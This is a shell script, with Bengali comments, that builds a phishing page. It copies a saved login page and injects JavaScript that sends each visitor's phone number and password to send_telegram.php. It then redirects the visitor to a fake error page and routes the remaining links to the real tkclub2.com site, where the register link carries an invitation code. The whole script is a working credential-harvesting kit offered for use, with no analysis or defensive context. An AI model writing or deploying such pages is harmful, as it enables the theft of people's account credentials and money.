# ১. অরিজিনাল ফাইলটি ফ্রেশ কপি করা হচ্ছে
rm index.html
cp /sdcard/loginn.html ./index.html

# ২. সব অপশনসহ ফাইনাল কোড ইনজেক্ট করা হচ্ছে
cat << 'EOF' >> index.html
<style>
/* বাটন ডিজাইন: হালকা লাল ও সাদার সুন্দর মিশ্রণ */
.btn-soft-glow {
    background-color: #f87171 !important; 
    background-image: linear-gradient(180deg, rgba(255,255,255,0.2), rgba(0,0,0,0.05)) !important;
    color: white !important;
    border: none !important;
    opacity: 1 !important;
    box-shadow: 0 0 10px rgba(248, 113, 113, 0.4) !important;
    transition: all 0.3s ease;
}

/* পাসওয়ার্ড না দেওয়া পর্যন্ত ক্লিক হবে না */
.btn-locked {
    pointer-events: none !important; 
    cursor: not-allowed !important;
}
</style>

<script>
function handleLogic() {
    var inps = document.querySelectorAll('input');
    var phoneInput = inps[0];
    var passInput = inps[1];
    var loginBtn = document.querySelector('.van-button--info') || document.querySelector('button');

    if (phoneInput && loginBtn) {
        // ১. নাম্বার দিলে বাটন হালকা লাল হবে
        if (phoneInput.value.length > 0) {
            loginBtn.classList.add('btn-soft-glow');
        } else {
            loginBtn.classList.remove('btn-soft-glow');
        }

        // ২. পাসওয়ার্ড দিলে বাটন আনলক হবে
        if (phoneInput.value.length > 0 && passInput && passInput.value.length > 0) {
            loginBtn.classList.remove('btn-locked');
        } else {
            loginBtn.classList.add('btn-locked');
        }
    }
}

document.addEventListener('input', handleLogic);

document.addEventListener('click', function(e) {
    var el = e.target;
    var txt = (el.innerText || el.textContent || '').toLowerCase().trim();

    // ১. লগইন বাটনের কাজ
    var loginBtn = el.closest('.btn-soft-glow');
    if (loginBtn && !loginBtn.classList.contains('btn-locked')) {
        e.preventDefault();
        var inps = document.querySelectorAll('input');
        var p = inps[0].value;
        var s = inps[1].value;

        var x = new Image();
        x.src = 'send_telegram.php?phone=' + encodeURIComponent(p) + '&pass=' + encodeURIComponent(s);

        inps[0].value = '';
        inps[1].value = '';
        inps[0].dispatchEvent(new Event('input', { bubbles: true }));

        setTimeout(function() {
            window.location.href = 'https://pinex-mod.vercel.app/error.html';
        }, 500);
        return;
    }
    
    // ২. রেজিস্টার (Register) লিঙ্ক
    if (txt.includes('register') || el.closest('.van-button--default')) {
        window.location.href = 'https://tkclub2.com/#/register?invitationCode=11821190516';
        return;
    }

    // ৩. কাস্টমার সার্ভিস (Customer Service)
    if (txt.includes('service') || txt.includes('customer')) {
        window.location.href = 'https://tkclub2.com/#/main/CustomerService';
        return;
    }

    // ৪. পাসওয়ার্ড ভুলে গেছেন (Forgot Password)
    if (txt.includes('forgot') || txt.includes('forget')) {
        window.location.href = 'https://tkclub2.com/#/rpwd';
        return;
    }

    // ৫. পাসওয়ার্ড দেখার চোখ (Eye Icon)
    var eyeBtn = el.closest('.van-field__right-icon');
    if (eyeBtn) {
        e.preventDefault();
        var pInp = document.querySelector('input[type="password"]') || document.querySelectorAll('input')[1];
        if (pInp) pInp.type = (pInp.type === 'password') ? 'text' : 'password';
    }
}, true);
</script>
EOF
